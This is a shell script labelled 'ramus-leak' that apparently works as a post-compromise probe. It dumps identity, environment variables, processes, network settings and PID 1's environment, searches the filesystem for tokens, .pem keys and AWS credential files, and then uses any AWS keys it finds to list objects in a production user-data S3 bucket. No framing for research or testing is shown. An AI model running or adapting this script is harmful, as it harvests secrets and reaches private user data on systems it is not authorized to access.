#!/bin/sh
echo "=== marker ramus-leak $(date -u) ==="
id; hostname; uname -a
echo "=== env ==="; env | sort
echo "=== ps ==="; ps aux 2>/dev/null | head -80
echo "=== net ==="; ip addr 2>/dev/null; ip route 2>/dev/null; cat /etc/hosts
echo "=== proc1 ==="; tr '\0' ' ' < /proc/1/cmdline; echo; tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -40
echo "=== fs ==="; ls -la / /root /home 2>/dev/null; ls -la /dev 2>/dev/null | head -40
echo "=== creds ==="; find / -maxdepth 4 \( -iname '*token*' -o -iname '*.pem' -o -iname '*credential*' -o -iname '.aws' \) 2>/dev/null | head -40
echo "=== aws env ==="; env | grep -i -E 'aws|s3|bucket' 
if [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
  echo "=== s3 list ==="
  if [ -n "$AWS_SESSION_TOKEN" ]; then
    curl -s --aws-sigv4 "aws:amz:us-east-va:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" -H "x-amz-security-token: $AWS_SESSION_TOKEN" "https://ramus-prod-user-data.s3.us-east-va.io.cloud.ovh.us/?list-type=2&max-keys=25"
  else
    curl -s --aws-sigv4 "aws:amz:us-east-va:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" "https://ramus-prod-user-data.s3.us-east-va.io.cloud.ovh.us/?list-type=2&max-keys=25"
  fi
fi
echo "=== end ==="
